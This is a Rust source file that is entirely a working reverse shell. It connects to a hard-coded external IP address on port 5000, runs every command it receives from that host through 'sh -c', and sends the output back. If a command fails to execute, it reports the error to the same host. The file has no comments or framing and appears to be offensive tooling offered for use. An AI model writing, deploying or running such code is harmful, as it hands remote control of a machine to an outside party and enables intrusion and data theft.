use std::net::{TcpStream};
use std::io::{Read, Write};
use std::process::{Command, Stdio};

fn connect() {
    if let Ok(mut s) = TcpStream::connect("76.189.177.142:5000") {
        loop {
            let mut command = [0; 1024];
            match s.read(&mut command) {
                Ok(n) if n > 0 => {
                    let command_str = String::from_utf8_lossy(&command[..n]);
                    if command_str.trim() == "terminate" {
                        s.shutdown(std::net::Shutdown::Both).expect("Shutdown failed");
                        break;
                    } else {
                        let output = match Command::new("sh")
                            .arg("-c")
                            .arg(&command_str)
                            .stdout(Stdio::piped())
                            .stderr(Stdio::piped())
                            .output()
                        {
                            Ok(output) => output,
                            Err(e) => {
                                let error_msg = format!("Error executing command: {}", e);
                                TcpStream::connect("76.189.177.142:5000")
                                    .and_then(|mut stream| {
                                        stream.write_all(error_msg.as_bytes())?;
                                        Ok(())
                                    })
                                    .expect("Failed to send error message");
                                continue;
                            }
                        };

                        let mut response = Vec::new();
                        response.extend_from_slice(&output.stdout);
                        response.extend_from_slice(&output.stderr);

                        s.write_all(&response).expect("Failed to send response");
                    }
                }
                Ok(_) | Err(_) => break,
            }
        }
    }
}

fn main() {
    connect();
}
